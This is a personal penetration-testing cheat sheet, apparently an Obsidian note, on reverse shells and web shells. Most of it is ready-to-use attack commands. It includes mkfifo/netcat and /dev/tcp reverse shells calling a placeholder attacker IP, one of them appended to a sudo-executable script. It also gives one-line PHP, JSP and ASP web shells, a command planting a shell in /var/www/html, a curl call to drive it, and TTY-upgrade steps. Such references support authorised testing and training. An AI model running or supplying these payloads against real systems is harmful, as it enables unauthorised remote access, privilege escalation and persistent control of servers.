---
id: Reverse Shell
aliases:
  - Revshell
tags:
  - Pentest/Reverse-Shell
---

<!-- Reverse Shell {{{-->
# Reverse Shell

- [RevShells.com](https://www.revshells.com/)
- [InternalAllTheThings - Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

<!-- Bash {{{-->
## Bash

```sh
script /dev/null -c bash
```

```sh
SHELL=/bin/bash script -q /dev/null
```

Append shell to sudo-executable file

```sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f' | tee -a <file.sh>
```

<!-- Interactive Shell {{{-->
### Interactive Shell

1. Suspend the current process

`^Z` (*CTRL+Z*)

2. Raw terminal mode with desable `echo` & bring [[Netcat]] to the foreground

```sh
stty raw -echo; fg
```

3. Export the `TERM` variable

```sh
export TERM=xterm
```
<!-- }}} -->

___
<!-- }}} -->

<!-- Python {{{-->
## Python

Check if Python is installed on the server

```sh
which python
```

```sh
which python3
```

<!-- Interactive shell {{{-->
### Interactive shell

1. Spawn a pseudo terminal with Python

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> [!info]-
>
> - `-c`: Run the following Python code in the command line
> - `import pty`: Import the pseudo-terminal module
> - `pty.spawn("/bin/bash")`: Spawn a new process
>   and connect it to the pseudo-terminal

2. Explot the `TERM` variable

```sh
export TERM=xterm
```

___
<!-- }}} -->

<!-- }}} -->

<!-- PHP {{{-->
## PHP

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f"); ?>
```
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'"); ?>
```
___
<!-- }}}-->

<!-- Upgrading TTY {{{-->
## Upgrading TTY

- [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

Map the TTY with the remote TTY

1. Hit `Ctrl + Z` to background the shell ang get back to the local terminal

```sh
^Z
```

2. Raw terminal mode with desable `echo` & bring [[Netcat]] to the foreground

```sh
stty raw -echo; fg
```

3. Hit `Enter` (*or input `reset` and hit `Enter`*)

4. Set shell variables to make the terminal full screen


```sh
# Show the `TERM` variable
export TERM=xterm
xterm-256color

# Show the values for `rows` and `columns`
stty size
67 318
```

Set the variables in the `netcat` shell

```sh
# Set `TERM`
export TERM=xterm-256color

# Set rows and columns
stty rows 67 columns 318
```
___
<!-- }}} -->

<!-- }}} -->

<!-- Web Shell {{{-->
# Web Shell

A Web Shell accepts the command through HTTP request parameters
(*e.g. `GET`, `POST`*) and prints the output to the webpage.

<!-- Examples {{{-->
## Examples

PHP

```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP

```asp
<% eval request("cmd") %>
```
___
<!-- }}} -->

<!-- Uploading a Web Shell {{{-->
## Uploading a Web Shell

The web shell should be placed into the remote host's
[[Web Server/Root|web root directory location]]
(*through a vulnerability or upload feature*)
and executed through the web browser.


> [!example]
>
> `bash` command to write a web shell to a Linux machine running Apache
>
> ```sh
> echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
> ```
___
<!-- }}} -->

<!-- Accessing Web Shell {{{-->
## Accessing Web Shell

The web shell may be accessed via a web browser or by using `cURL`.

```sh
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

A web shell would bypass any firewall restriction as it will not open a new
connection on a port bup use `80`or `443`.
___
<!-- }}} -->

<!-- }}} -->
